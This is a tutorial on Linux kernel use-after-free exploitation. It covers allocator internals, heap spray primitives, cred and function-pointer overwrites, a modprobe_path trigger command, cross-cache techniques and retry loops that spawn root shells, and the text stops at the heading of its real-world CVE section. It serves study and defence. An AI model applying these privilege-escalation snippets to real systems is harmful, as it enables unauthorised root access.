# 4b. Use-After-Free Exploitation in the Linux Kernel

## Table of Contents

1. [How Use-After-Free Bugs Arise in the Kernel](#1-how-use-after-free-bugs-arise-in-the-kernel)
2. [The SLUB Allocator and Freed Object Reuse](#2-the-slub-allocator-and-freed-object-reuse)
3. [Techniques to Reclaim Freed Kernel Objects](#3-techniques-to-reclaim-freed-kernel-objects)
4. [Common UAF Targets](#4-common-uaf-targets)
5. [Exploiting UAF for Privilege Escalation](#5-exploiting-uaf-for-privilege-escalation)
6. [Cross-Cache UAF Exploitation Techniques](#6-cross-cache-uaf-exploitation-techniques)
7. [Stabilizing UAF Exploitation](#7-stabilizing-uaf-exploitation)
8. [Real-World UAF CVEs and Their Exploitation](#8-real-world-uaf-cves-and-their-exploitation)
9. [Mitigations and Defenses](#9-mitigations-and-defenses)
10. [References](#10-references)

---

## 1. How Use-After-Free Bugs Arise in the Kernel

Use-After-Free (UAF) vulnerabilities occur when kernel code continues to access a memory region after that memory has been freed and potentially reallocated for a different purpose. In the Linux kernel, UAF bugs are among the most prevalent and dangerous vulnerability classes, consistently appearing in privilege escalation exploits. They arise from several fundamental patterns.

### 1.1 Reference Counting Errors

The Linux kernel relies extensively on reference counting to manage object lifetimes. Structures like `struct pid`, `struct file`, `struct cred`, and `struct sock` all use reference counts (typically via `atomic_t count` or `refcount_t`) to determine when an object can be safely freed. UAF bugs emerge when these counts become skewed.

**Over-decrement (extra `put`):**

When a reference is dropped without a corresponding acquisition, the refcount reaches zero prematurely. The object is freed while other code paths still hold (uncounted) references. A canonical example is the `TIOCSPGRP` bug (Project Zero issue 2125), where a locking error in the TTY subsystem allowed concurrent `ioctl` calls to race on the `pgrp` field:

```c
// Bug: Lock taken on wrong tty_struct (tty vs real_tty)
// Two threads can race and double-decrement the old pid's refcount
ioctl(fd1, TIOCSPGRP, pid_A)        ioctl(fd2, TIOCSPGRP, pid_B)
  spin_lock_irq(&tty->ctrl_lock)      spin_lock_irq(&tty->ctrl_lock)
  put_pid(old_pid)                     put_pid(old_pid)  // double put!
  real_tty->pgrp = get_pid(A)         real_tty->pgrp = get_pid(B)
  spin_unlock_irq(...)                 spin_unlock_irq(...)
```

The fix was a single-line change -- locking `real_tty->ctrl_lock` instead of `tty->ctrl_lock`.

**Under-increment (missing `get`):**

A pointer to an object is stored or shared without incrementing the reference count. When the original reference is dropped, the object is freed, leaving a dangling pointer at the site that failed to take its own reference.

**Asymmetric reference management:**

In the `firewall_dup_rule` bug from the Wall of Perdition CTF challenge, duplicating a rule created a second pointer to the same allocation in another array. Deleting the rule from the original array freed the memory and NULLed that pointer, but the duplicate pointer remained valid -- a classic UAF:

```c
static long firewall_dup_rule(user_rule_t user_rule, rule_t **firewall_rules, uint8_t idx)
{
    // ...
    dup[i] = firewall_rules[idx];  // Second pointer, no new allocation
    firewall_rules[idx]->is_duplicated = 1;
    // ...
}

static long firewall_delete_rule(user_rule_t user_rule, rule_t **firewall_rules, uint8_t idx)
{
    kfree(firewall_rules[idx]);    // Frees the object...
    firewall_rules[idx] = NULL;    // ...NULLs this pointer, but dup[i] still valid!
}
```

### 1.2 Missing or Incorrect Locking

Race conditions between concurrent code paths that access shared data structures are a primary source of UAF bugs in the kernel. When proper locking is absent or the wrong lock is used, the following scenario becomes possible:

```
Thread A                          Thread B
--------                          --------
obj = lookup(key);                
                                  delete(key);  // frees obj
obj->field = value;               // UAF write!
```

This pattern is especially common in subsystems that mix fine-grained per-object locking with coarser subsystem-level locks, or where RCU read-side critical sections are incorrectly paired with updates. The `io_uring` subsystem has been a notable source of such bugs due to its complexity and the interaction between deferred work items, hardirq contexts, and task-level operations.

### 1.3 Premature Free / Lifetime Confusion

Objects in the kernel often have complex lifetimes spanning multiple states: initialized, active (with various sub-states), teardown, and RCU grace period pending. UAF bugs occur when code operating in one lifetime state frees the object while other code expects it to be in a different state.

A particularly subtle variant involves `union` members used in different lifetime phases. For example, many structures have an `rcu_head` in a union with active-state fields:

```c
struct allowedips_node {
    struct wg_peer __rcu *peer;
    // ...
    union {
        struct list_head peer_list;  // Used while object is live
        struct rcu_head rcu;         // Used during deferred freeing
    };
};
```

If a bug causes `peer_list` to be accessed after `rcu` has been initialized for deferred freeing, type confusion and UAF result.

### 1.4 RCU Misuse

Read-Copy-Update (RCU) is a synchronization mechanism that allows readers to access data structures without locking, while writers defer freeing until all readers have finished. UAF bugs arise when:

- An RCU-protected pointer is dereferenced outside an `rcu_read_lock()` / `rcu_read_unlock()` section
- A writer frees memory immediately (`kfree`) instead of deferring (`kfree_rcu`)
- A reader upgrades a reference (e.g., to modify the object) without properly acquiring a strong reference first via `refcount_inc_not_zero()`

### 1.5 Timer and Callback Races

Deferred work mechanisms (timers, workqueues, tasklets) create opportunities for UAF when an object is freed while a pending callback still references it. The CVE-2022-29582 `io_uring` vulnerability is a prime example: a race between an `IORING_OP_TIMEOUT` being flushed and its linked `IORING_OP_LINK_TIMEOUT`'s `hrtimer` firing could leave a dangling reference in a linked list, because the `list_del_init` was skipped when `refcount_inc_not_zero()` returned false:

```c
static enum hrtimer_restart io_link_timeout_fn(struct hrtimer *timer)
{
    // ...
    if (!list_empty(&req->link_list)) {
        prev = list_entry(req->link_list.prev, struct io_kiocb, link_list);
        if (refcount_inc_not_zero(&prev->refs))
            list_del_init(&req->link_list);
        else
            prev = NULL;  // Bug: LT stays on link_list with dangling reference
    }
    // ...
}
```

---

## 2. The SLUB Allocator and Freed Object Reuse

Understanding the SLUB allocator is fundamental to exploiting UAF bugs, as it determines how and when freed memory is recycled.

### 2.1 SLUB Architecture Overview

The SLUB allocator (the default slab allocator in modern Linux kernels) organizes memory into **slab caches**, each serving objects of a specific size or type. Key architectural components:

```
kmem_cache (e.g., "kmalloc-512")
  |
  +-- kmem_cache_cpu [per-CPU]
  |     |-- page (active slab: where next allocation comes from)
  |     |-- freelist (pointer to next free object in active slab)
  |     +-- partial (per-CPU partial list of partially-free slabs)
  |
  +-- kmem_cache_node [per-NUMA-node]
        +-- partial (node-level partial list)
```

**Dedicated caches** serve specific structure types (e.g., `filp` for `struct file`, `cred_jar` for `struct cred`, `pid` for `struct pid`). **General caches** (`kmalloc-32`, `kmalloc-64`, ..., `kmalloc-8k`) serve arbitrary allocations based on size.

### 2.2 LIFO Freelist Behavior

The SLUB freelist within a slab operates in a **Last-In-First-Out (LIFO)** manner. When an object is freed, it is placed at the head of the slab's freelist. The next allocation from that slab returns the most recently freed object:

```
State: freelist -> [obj_C] -> [obj_A] -> NULL

kfree(obj_B);
State: freelist -> [obj_B] -> [obj_C] -> [obj_A] -> NULL

new = kmalloc(size, ...);   // Returns obj_B
State: freelist -> [obj_C] -> [obj_A] -> NULL
```

This LIFO behavior is critical for exploitation: if an attacker can trigger a free followed by a controlled allocation of the same size and cache, the new allocation will **deterministically** land at the same address as the freed object. Any dangling pointers to the original object now point to the attacker-controlled replacement.

### 2.3 Freelist Pointer Storage and Hardening

The freelist linkage between free objects is stored within the objects themselves. In vanilla kernels, the first 8 bytes (on x86-64) of a freed object are overwritten with the freelist pointer.

Starting with kernel 5.7, the freelist pointer position was moved to the **middle** of the object (at `offset = object_size / 2`, aligned), making some exploitation techniques harder.

With `CONFIG_SLAB_FREELIST_HARDENED` (enabled on most distributions), the freelist pointer is XOR-obfuscated:

```c
static inline void *freelist_ptr(const struct kmem_cache *s, void *ptr, unsigned long ptr_addr)
{
    return (void *)((unsigned long)ptr ^ s->random ^ swab((unsigned long)ptr_addr));
}
```

This means that when an object is freed, its stored freelist pointer looks like random data. An attacker cannot easily predict or forge freelist pointers without first leaking the per-cache random value.

Additionally, `CONFIG_SLAB_FREELIST_RANDOM` randomizes the initial order of objects within a newly allocated slab, preventing attackers from predicting which object position will be returned first.

### 2.4 Slab Merging

To reduce memory fragmentation, the kernel can **merge** slab caches with compatible properties (same object size, alignment, and flags). The `find_mergeable()` function checks these criteria. On Debian, for example:

```
# ls -l /sys/kernel/slab/pid
pid -> :A-0000128
# ls -l /sys/kernel/slab/ | grep :A-0000128
:A-0000128
eventpoll_epi -> :A-0000128
pid -> :A-0000128
seq_file -> :A-0000128
```

Here `struct pid`, `struct epitem`, and `struct seq_file` all share the same underlying cache because their sizes and flags are compatible. This has profound exploitation implications: a freed `struct pid` can be replaced by a `struct seq_file` or vice versa.

Merging can be disabled with the `slab_nomerge` kernel command line parameter or by using cache-specific flags (`SLAB_TYPESAFE_BY_RCU`, `SLAB_ACCOUNT`) that prevent merging.

### 2.5 The Page Allocator (Buddy Allocator)

Beneath the SLUB allocator sits the **buddy allocator** (page allocator), which manages physical pages. Each slab is backed by one or more contiguous pages (an "order-N" allocation provides 2^N pages). Key characteristics:

- **Per-CPU freelists** for order-0 pages (PCP -- Per-CPU Page allocator) provide fast allocation without global locking
- **Buddy merging**: when two adjacent free blocks of order N exist, they merge into an order N+1 block
- **FIFO behavior** at the page level (contrasting with SLUB's LIFO)

When a slab becomes completely empty, SLUB may return its pages to the buddy allocator. These pages can then be reused for **any** purpose -- a different slab cache, page tables, pipe buffers, or user-space page mappings. This is the basis of **cross-cache** attacks.

---

## 3. Techniques to Reclaim Freed Kernel Objects

The core exploitation technique for UAF is **object replacement**: allocating a new, attacker-controlled object at the exact memory location of the freed object. The dangling pointer then provides read/write access to the replacement object's fields.

### 3.1 Same-Cache Replacement (Direct Reclaim)

The simplest scenario: if the freed object's cache is accessible and allows user-controlled allocations, the attacker simply allocates objects of the same type/size until one lands in the freed slot.

**Using `msg_msg` for heap spray:**

The `msg_msg` structure (System V IPC) is the most versatile heap spray primitive. Its size is user-controlled from `kmalloc-64` to `kmalloc-4k`, and its content is fully user-controlled after the 48-byte header:

```c
struct msg_msg {
    struct list_head m_list;   // 16 bytes
    long m_type;               // 8 bytes
    size_t m_ts;               // 8 bytes (message text size)
    struct msg_msgseg *next;   // 8 bytes
    void *security;            // 8 bytes
    /* user-controlled data follows immediately (up to PAGE_SIZE - 48 bytes) */
};
```

For messages exceeding `PAGE_SIZE - 48` bytes, continuation segments (`msg_msgseg`) are allocated with only an 8-byte header:

```c
struct msg_msgseg {
    struct msg_msgseg *next;   // 8 bytes
    /* user-controlled data follows (up to PAGE_SIZE - 8 bytes) */
};
```

**Spray procedure:**

```c
// Create message queue
int qid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);

// Spray messages of target size into target cache
struct { long mtype; char mtext[TARGET_SIZE - 48]; } msg;
msg.mtype = 1;
memset(msg.mtext, 'A', sizeof(msg.mtext));  // Controlled content
msgsnd(qid, &msg, sizeof(msg.mtext), 0);
```

**Using `setxattr` for precise single-shot spray:**

The `setxattr` syscall allocates a buffer of user-controlled size via `kvmalloc`, copies user data into it, and then frees it. By blocking in the write path (e.g., via FUSE or userfaultfd), the allocated buffer can be kept alive:

```c
// Allocates a kmalloc-<size> object with controlled content
setxattr("/tmp/x", "user.x", payload, TARGET_SIZE, 0);
```

**Using `add_key` for `user_key_payload`:**

```c
struct user_key_payload {
    struct rcu_head rcu;       // 16 bytes
    unsigned short datalen;    // 2 bytes
    char data[] __aligned(8);  // user-controlled data
};
```

The `add_key()` syscall allocates payloads of user-specified sizes, landing in general kmalloc caches. Content is fully controlled, and the object persists until the key is revoked or the keyring is destroyed.

### 3.2 Reading Back Data from Replaced Objects

A critical part of exploitation is reading the *current* contents of the freed-and-replaced object. Several techniques exist:

**`msg_msg` with `MSG_COPY`:**

When receiving messages with the `MSG_COPY` flag (requires `CONFIG_CHECKPOINT_RESTORE`), the kernel copies the message data to userspace **without unlinking** the message from the queue. This provides a non-destructive read that can be repeated:

```c
// Non-destructive read of message contents
msgrcv(qid, buffer, size, 0, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);
```

**`msg_msg` with corrupted `m_ts`:**

By overwriting the `m_ts` field of a `msg_msg` to a value larger than the actual message, `msgrcv()` will copy data beyond the message boundaries, providing an **out-of-bounds read** into adjacent slab objects. This is a powerful information leak primitive.

**`/proc/self/stat` and `seq_file`:**

Reading `/proc` files backed by `seq_file` triggers calls through the `seq_operations` function pointers. If a freed `seq_file` is replaced with controlled data, the function pointers can be redirected.

### 3.3 Page-Level Spray Primitives

When the target object lives in a dedicated cache that cannot be directly sprayed, page-level techniques are needed. The `PACKET_TX_RING` / `PACKET_RX_RING` mechanism (from `AF_PACKET` sockets) provides precise control over page allocation:

```c
// Allocate tp_block_nr pages of order log2(tp_block_size/PAGE_SIZE)
int alloc_pages_via_sock(uint32_t block_size, uint32_t block_nr)
{
    int fd = socket(AF_PACKET, SOCK_RAW, PF_PACKET);
    int version = TPACKET_V1;
    setsockopt(fd, SOL_PACKET, PACKET_VERSION, &version, sizeof(version));

    struct tpacket_req req = {
        .tp_block_size = block_size,    // Must be page-aligned
        .tp_block_nr = block_nr,
        .tp_frame_size = 4096,
        .tp_frame_nr = (block_size * block_nr) / 4096,
    };
    setsockopt(fd, SOL_PACKET, PACKET_TX_RING, &req, sizeof(req));
    return fd;  // close(fd) frees the pages
}
```

This requires `CAP_NET_RAW` or an unprivileged user namespace. The pages are freed when the socket is closed, giving precise free timing.

---

## 4. Common UAF Targets

Certain kernel structures are repeatedly targeted in UAF exploits due to their accessible allocation patterns, useful fields, and security-critical contents.

### 4.1 `struct cred` (Credential Structure)

```c
struct cred {
    atomic_t    usage;          // offset 0x00, reference count
    kuid_t      uid;            // offset 0x04, real user ID
    kgid_t      gid;            // offset 0x08, real group ID
    kuid_t      suid;           // offset 0x0c, saved user ID
    kgid_t      sgid;           // offset 0x10, saved group ID
    kuid_t      euid;           // offset 0x14, effective user ID
    kgid_t      egid;           // offset 0x18, effective group ID
    kuid_t      fsuid;          // offset 0x1c, filesystem user ID
    kgid_t      fsgid;          // offset 0x20, filesystem group ID
    unsigned    securebits;     // offset 0x24
    kernel_cap_t cap_inheritable; // offset 0x28
    kernel_cap_t cap_permitted;   // offset 0x30
    kernel_cap_t cap_effective;   // offset 0x38
    kernel_cap_t cap_bset;        // offset 0x40
    kernel_cap_t cap_ambient;     // offset 0x48
    // ... (namespaces, keyrings, etc.)
};
```

**Size:** ~176 bytes (allocated from `cred_jar`, which uses `kmalloc-192` equivalent slabs)

**Why targeted:** Directly controls process privileges. Overwriting `uid`/`gid`/`euid`/`egid` to 0 grants root. Overwriting `cap_effective` to all-ones grants all capabilities.

**Isolation:** Allocated from the dedicated `cred_jar` cache with `SLAB_ACCOUNT` flag, preventing slab merging. This historically made `cred` attacks "impossible" -- until cross-cache techniques were developed.

**Allocation trigger:** `fork()` / `clone()` calls `copy_creds()` -> `prepare_creds()`, which allocates from `cred_jar`.

### 4.2 `struct file`

```c
struct file {
    union {
        struct llist_node fu_llist;
        struct rcu_head fu_rcuhead;
    } f_u;
    struct path         f_path;        // mount + dentry
    struct inode        *f_inode;
    const struct file_operations *f_op; // function pointer table!
    spinlock_t          f_lock;
    atomic_long_t       f_count;       // reference count
    unsigned int        f_flags;
    fmode_t             f_mode;
    // ...
};
```

**Size:** ~384 bytes (allocated from the dedicated `filp` cache, backed by order-1 slabs on many configurations)

**Why targeted:** Contains `f_op`, a pointer to a function pointer table. Controlling `f_op` allows hijacking of `read`, `write`, `ioctl`, `mmap`, and other operations. Also useful for arbitrary read/write by manipulating `f_pos`, `f_mapping`, etc.

### 4.3 `struct inode`

**Size:** Variable (base ~600 bytes, but filesystem-specific inodes embed it within larger structures)

**Why targeted:** Contains `i_fop` (file operations for new opens), `i_op` (inode operations), and security-relevant fields like `i_uid`, `i_gid`, `i_mode`.

### 4.4 Socket Structures

**`struct sock` / protocol-specific sockets:**

Socket structures contain function pointer tables (`sk_prot`), buffers, and protocol state. The `tls_context` structure (~408 bytes, `kmalloc-512`) has been used in exploits as both a leak source and a hijack target:

```c
struct tls_context {
    struct tls_prot_info prot_info;
    // ...
    struct proto *sk_proto;          // Points to tcp_prot (fixed kernel offset)
    // ...
    struct list_head list;           // next/prev point back to own address
    // ...
    void (*sk_destruct)(struct sock *sk);
    // ...
};
```

`sk_proto` provides a KASLR leak (it points to `tcp_prot` at a fixed offset from kernel base), while `sk_destruct` provides a code execution vector.

### 4.5 `struct seq_file` and `struct seq_operations`

```c
struct seq_operations {
    void * (*start) (struct seq_file *m, loff_t *pos);
    void   (*stop)  (struct seq_file *m, void *v);
    void * (*next)  (struct seq_file *m, void *v, loff_t *pos);
    int    (*show)  (struct seq_file *m, void *v);
};
```

**Size:** 32 bytes (`kmalloc-32`)

**Why targeted:** Contains four function pointers pointing to kernel text (useful for KASLR leaks). Allocated by opening `/proc/self/stat` or similar proc files. Merges with other `kmalloc-32` objects.

### 4.6 `struct pipe_buffer`

```c
struct pipe_buffer {
    struct page *page;
    unsigned int offset, len;
    const struct pipe_buf_operations *ops;  // function pointers
    unsigned int flags;
    unsigned long private;
};
```

**Size:** 40 bytes (but allocated in arrays; `pipe_bufs_cachep` or kmalloc depending on count)

**Why targeted:** Controllable through `pipe()` + `splice()` operations. The `ops` table contains function pointers for KASLR leaks. The `page` pointer can be manipulated for arbitrary page access.

---

## 5. Exploiting UAF for Privilege Escalation

### 5.1 Data-Only Attack: Overwriting `cred` UIDs

The most elegant UAF exploitation technique is a **data-only** attack that overwrites credential fields without ever hijacking control flow. This approach bypasses CFI, SMEP, SMAP, and KPTI.

**Attack concept:**

```
1. Trigger UAF on an object adjacent to (or replaced by) a cred struct
2. Overwrite uid/gid/euid/egid fields to 0 (root)
3. Maintain a valid usage count to prevent kernel panics
4. The process with the corrupted cred now has root privileges
```

**The cross-cache cred overwrite (Will's Root, corCTF 2022):**

This technique demonstrated that overwriting cred structs via cross-cache overflow is feasible even against isolated slab caches:

```c
// Overflow payload: keep usage=1 (valid), zero out uid
char evil[CHUNK_SIZE];
memset(evil, 0, sizeof(evil));
*(uint32_t*)&evil[CHUNK_SIZE - 0x6] = 1;  // cred->usage = 1
// The two bytes after overwrite uid = 0 (root)
```

The payload is designed to:
1. Set `cred->usage` to 1 (maintaining a valid reference count so the kernel doesn't free or complain)
2. Set `cred->uid` to 0 (root)

After spraying this overflow across all vulnerable objects, forked child processes check their UID:

```c
// In child process (using raw syscall to avoid libc caching)
if (syscall(SYS_getuid) == 0) {
    execve("/bin/sh", args, NULL);  // Root shell!
}
```

### 5.2 Control Flow Hijack via Function Pointer Overwrite

When data-only attacks are not feasible, UAF can be used to hijack function pointers:

**Step 1: Leak kernel base (defeat KASLR)**

Replace a freed object with one containing known function pointers:

```c
// Open /proc/self/stat to allocate seq_operations in kmalloc-32
int fd = open("/proc/self/stat", O_RDONLY);
// seq_operations->start = single_start (known offset from kernel base)
// Read back through UAF to leak the pointer value
```

**Step 2: Overwrite function pointer**

Replace the freed object with controlled data that redirects a function pointer to a ROP gadget or to `commit_creds(prepare_kernel_cred(0))`:

```c
// Classic privilege escalation function chain
void escalate() {
    commit_creds(prepare_kernel_cred(0));
}
```

**Step 3: Trigger the function pointer**

Invoke the operation that calls through the overwritten pointer (e.g., `read()` on a file with corrupted `f_op`, or `read()` on a `seq_file` with corrupted `seq_operations->start`).

### 5.3 Arbitrary Read/Write via `msg_msg` Corruption

The `msg_msg` structure can be weaponized into both arbitrary read and arbitrary write primitives through UAF:

**Arbitrary read (OOB read via `m_ts` corruption):**

```
1. Trigger UAF to get a dangling pointer to a msg_msg object
2. Overwrite m_ts to a value larger than the actual message
3. Use msgrcv() with MSG_COPY to read beyond message boundaries
4. Adjacent slab objects are leaked to userspace
```

**Arbitrary read (segment pointer redirection):**

```
1. Overwrite msg_msg->next to point to an arbitrary kernel address
2. Use msgrcv() with MSG_COPY -- the kernel follows the next pointer
   and copies data from the arbitrary address to userspace
3. Provides true arbitrary kernel memory read
```

**Arbitrary write (via FUSE/userfaultfd stalling):**

```
1. Map the msgsnd() source buffer on FUSE/userfaultfd
2. Call msgsnd() -- kernel allocates msg_msg and starts copy_from_user()
3. The first copy_from_user() blocks in the FUSE handler
4. Meanwhile, use the UAF to overwrite msg_msg->next to target address
5. Release the FUSE handler -- copy_from_user() continues and writes
   controlled data to the arbitrary target address via the corrupted next pointer
```

This FUSE-based arbitrary write technique was used in the CVE-2022-27666 exploit (esp6 overflow) and many others to overwrite `modprobe_path`:

```c
// Overwrite modprobe_path with path to attacker's script
char payload[] = "/tmp/pwn\0";
// ... write payload to modprobe_path address via msg_msg arb write ...

// Trigger modprobe execution by running a file with unknown magic
system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/fake && chmod +x /tmp/fake && /tmp/fake");
// Kernel executes /tmp/pwn as root to "load" the "module"
```

### 5.4 Page Table Entry Manipulation

Jann Horn's exploit for the `TIOCSPGRP` bug demonstrated a sophisticated technique: replacing the freed page with a **page table** and incrementing a PTE to gain write access to read-only file mappings:

```
1. Free the struct pid's underlying page to the buddy allocator
2. Map a 2MiB-aligned region of single-page read-only file mappings
3. Touch each mapping to populate PTEs, causing the freed page to be
   allocated as a page table
4. Use the UAF increment primitive (get_pid) to increment a PTE value
5. Incrementing by 0x42 sets the Read/Write and Dirty bits
6. Write shellcode to the now-writable file mapping of a setuid binary
7. Execute the modified setuid binary for root
```

This technique requires **no kernel address leak** and **no direct instruction pointer hijack** -- it operates entirely through data manipulation of page table entries.

---

## 6. Cross-Cache UAF Exploitation Techniques

Cross-cache attacks allow exploiting UAF bugs even when the vulnerable object lives in a dedicated (isolated) slab cache. The fundamental insight is that all slab caches ultimately allocate pages from the same buddy allocator.

### 6.1 The Problem: Slab Isolation

Many security-critical structures are allocated from dedicated caches that cannot be merged:

| Structure | Cache | Isolation Mechanism |
|-----------|-------|-------------------|
| `struct cred` | `cred_jar` | `SLAB_ACCOUNT` |
| `struct file` | `filp` | Dedicated cache |
| `struct task_struct` | `task_struct` | Dedicated cache |
| `struct io_kiocb` | `io_kiocb_cache` | Dedicated cache |

An attacker cannot directly spray `msg_msg` objects into the `cred_jar` cache at the SLUB level.

### 6.2 The Solution: Page-Level Reuse

The cross-cache technique exploits the fact that when a slab page is completely emptied and returned to the buddy allocator, it can be reallocated for any purpose:

```
SLUB level:    [cred_jar page]  ->  [empty slab freed to buddy]
Buddy level:   [free page]      ->  [reallocated as kmalloc-512 slab]
SLUB level:    [kmalloc-512 objects now occupy former cred_jar page]
```

### 6.3 Step-by-Step Cross-Cache Procedure

The CVE-2022-29582 exploit (io_uring) provides a detailed template:

**Phase 1: Drain the target cache**

Force the target cache to allocate new slabs from the buddy allocator by filling all existing partial slabs:

```c
// Drain the filp cache by opening many file descriptors
for (int i = 0; i < DRAIN_COUNT; i++) {
    fds[i] = open("/dev/null", O_RDONLY);
}
```

**Phase 2: Trigger the UAF and free the target page**

The key is to free ALL objects on the target slab page, causing SLUB to return it to the buddy allocator:

```
1. Pin to a single CPU (sched_setaffinity) to avoid per-CPU list confusion
2. Fill (objs_per_slab * (1 + cpu_partial)) objects to drain partial lists
3. Allocate the victim object
4. Trigger the UAF bug
5. Allocate more objects to push the victim's page off the active slab
6. Free all objects on the victim's page (making it empty)
7. Overflow the cpu_partial list to trigger unfreeze_partials()
   - Empty pages are returned to the buddy allocator!
```

**Checking slab parameters:**

```bash
# Objects per slab and cpu_partial can be read from sysfs
cat /sys/kernel/slab/filp/objs_per_slab    # e.g., 25
cat /sys/kernel/slab/filp/cpu_partial       # e.g., 13
```

**Phase 3: Reallocate the page for a different cache**

Spray allocations from the desired target cache. The buddy allocator will reuse the freed page:

```c
// Spray msg_msgseg objects (kmalloc-512) to reclaim the freed filp page
for (int i = 0; i < SPRAY_COUNT; i++) {
    struct { long mtype; char data[4500]; } msg;
    msg.mtype = i + 1;
    memset(msg.data, 0, sizeof(msg.data));
    // Set up fake file fields at the correct offset within msg_msgseg
    msgsnd(msq_ids[i], &msg, sizeof(msg.data), 0);
}
```

**Phase 4: Exploit the type confusion**

The original dangling pointer (e.g., to a `struct file`) now points to an object of a different type (e.g., `msg_msgseg`), giving the attacker read/write control over what the kernel treats as the original type.

### 6.4 Buddy Allocator Ordering Considerations

A critical constraint in cross-cache attacks is **page order matching**. Each slab cache uses pages of a specific order:

| Cache | Typical Order | Page Size |
|-------|--------------|-----------|
| `kmalloc-128` / `cred_jar` | 0 | 4 KiB |
| `kmalloc-512` / `filp` | 1 | 8 KiB |
| `kmalloc-4k` | 3 | 32 KiB |

For reliable cross-cache, the source and target caches should use the **same page order** to avoid buddy allocator splitting/merging complications. When orders differ, additional manipulation of the buddy free lists is required (draining intermediate orders, forcing splits from higher orders).

### 6.5 Cross-Cache Against `cred_jar`

The DirtyCred technique (BlackHat USA 2022) and Will's Root corCTF 2022 exploit demonstrated cross-cache attacks specifically targeting `struct cred`:

**High-level approach (Will's Root):**

```
1. Drain cred_jar: fork() many times to exhaust existing cred slabs
2. Drain order-0 buddy pages: use PACKET_TX_RING to allocate many order-0 pages
3. Free every other page: prevent buddy merging by creating alternating free/used pattern
4. Spray cred allocations: clone() with CLONE_FILES|CLONE_FS|CLONE_VM|CLONE_SIGHAND
   (minimal noise: only allocates cred_jar, signal_cache, pid, task_struct + vmalloc)
5. Free remaining held pages
6. Spray vulnerable objects: these pages land adjacent to / in former cred slab pages
7. Overflow from vulnerable object into adjacent cred struct
8. Overwrite uid/gid to 0
```

**Noise reduction with `clone()` flags:**

A standard `fork()` triggers dozens of allocations across many caches. By using `clone()` with specific flags, allocation noise is dramatically reduced:

```c
// Standard fork: ~30 slab allocations across many caches
// Optimized clone: only 7 slab allocations
pid_t result = clone(child_fn, stack, 
    CLONE_FILES | CLONE_FS | CLONE_VM | CLONE_SIGHAND, NULL);
// Allocations: task_struct, kmalloc-64, vmap_area(x2), cred_jar, signal_cache, pid
```

---

## 7. Stabilizing UAF Exploitation

Kernel UAF exploitation is inherently fragile. A single wrong memory access can cause a kernel panic, terminating the exploit and potentially the entire system. Multiple techniques exist to improve reliability.

### 7.1 CPU Pinning

Both SLUB and the page allocator use per-CPU data structures. If the exploit thread migrates to a different CPU between operations, the carefully crafted slab state is invalidated:

```c
cpu_set_t set;
CPU_ZERO(&set);
CPU_SET(0, &set);
sched_setaffinity(0, sizeof(set), &set);
```

### 7.2 Heap Grooming (Feng Shui)

**Slab-level grooming:**

```
1. Drain all partial slabs by filling them completely
2. Allocate victim objects on a fresh slab (known clean state)
3. Create a "sandwich" pattern: padding | victim | padding
4. After UAF, the replacement object position is deterministic
```

**Page-level grooming for cross-cache:**

```
1. Drain the target order's free_list
2. Allocate pages from higher order (they split, creating contiguous pairs)
3. Free the target page and its intended neighbor in sequence
4. The replacement allocation for the neighbor order reclaims adjacent memory
```

**Mitigating noise from lower orders (CVE-2022-27666 technique):**

```
1. Drain free_lists of orders 0, 1, 2
2. Allocate N order-2 objects (borrows from order 3)
3. Free every other order-2 object (prevents buddy merging back to order 3)
4. Free the objects from step 1
5. Result: order 2 free_list is well-stocked, preventing interference with order-3 operations
```

### 7.3 Blocking Primitives for Race Windows

Many UAF exploits require the freed-and-replaced object to remain in a specific state during a narrow race window. Blocking primitives "pause" kernel execution at a controlled point:

**FUSE (Filesystem in Userspace):**

```
1. Create a FUSE filesystem
2. Map a buffer on the FUSE filesystem
3. When the kernel calls copy_from_user() on this buffer, the FUSE
   handler blocks, pausing kernel execution at a controlled point
4. The exploit modifies kernel state while the kernel waits
5. The FUSE handler resumes, and the kernel continues with modified state
```

Available without privilege in user namespaces. More reliable than userfaultfd (which requires `CAP_SYS_PTRACE` or `vm.unprivileged_userfaultfd=1` since kernel 5.11).

**Pipe blocking:**

For `IORING_OP_TEE` or `splice` operations, reading from an empty pipe blocks until data is available:

```c
int pipefd[2];
pipe(pipefd);
// io_uring TEE from pipefd[0] blocks until data written to pipefd[1]
// This "pins" the io_kiocb request in memory for as long as needed
```

**Cross-thread page fault stalling:**

Using `madvise(MADV_DONTNEED)` to invalidate pages, then triggering faults from kernel context that must wait for page-in.

### 7.4 Preserving Critical Fields

When replacing a freed object, the replacement data must maintain validity of fields that the kernel may access:

- **Reference counts** must be non-zero and reasonable (typically 1)
- **List pointers** (`list_head`) should point to valid memory (or be self-referencing)
- **Function pointers** must point to valid kernel text or be NULL (with corresponding null-check paths)
- **Lock state** must be consistent (unlocked, or locked by the right context)
- **Magic values**: some structures have magic fields checked by the kernel (e.g., `STACK_END_MAGIC = 0x57AC6E9D`)

Example from Will's Root exploit adapting to Ubuntu's `CONFIG_SCHED_STACK_END_CHECK`:

```c
// Ubuntu checks *(end_of_stack(task)) == STACK_END_MAGIC (0x57AC6E9D)
// The overflow payload hits kernel stacks, so usage field must be this value
// Fortunately, 0x57AC6E9D is also a valid (non-zero) cred usage count
*(uint32_t*)&evil[CHUNK_SIZE - 0x6] = 0x57AC6E9D;
```

### 7.5 Handling Kernel Oops Recovery

When an exploit path might cause an oops (e.g., accessing a corrupted freelist pointer), the kernel's default behavior on most distributions is to kill the faulting thread but continue running. This can be used as an **oracle**:

```c
// Fork a child to attempt the dangerous operation
pid_t child = fork();
if (child == 0) {
    // Attempt UAF access -- may oops
    trigger_uaf_access();
    _exit(0);
}
int status;
waitpid(child, &status, 0);
if (WIFSIGNALED(status) && WTERMSIG(status) == SIGKILL) {
    // Child was killed by kernel oops -- the object was freed
    // We can now proceed with reallocation
}
```

However, on hardened systems with `panic_on_oops=1` (Android, Chrome OS), this technique is unavailable. Exploits must be designed to avoid any invalid memory accesses.

### 7.6 Retry Strategies

For probabilistic exploits (especially race conditions), a retry loop can be wrapped around the entire exploit:

```c
for (int attempt = 0; attempt < MAX_ATTEMPTS; attempt++) {
    pid_t child = fork();
    if (child == 0) {
        if (try_exploit() == SUCCESS) {
            execve("/bin/sh", args, NULL);
        }
        _exit(1);
    }
    waitpid(child, &status, 0);
    if (WIFEXITED(status) && WEXITSTATUS(status) == 0) break;
    // Clean up and retry
}
```

---

## 8. Real-World UAF CVEs and Their Exploitation

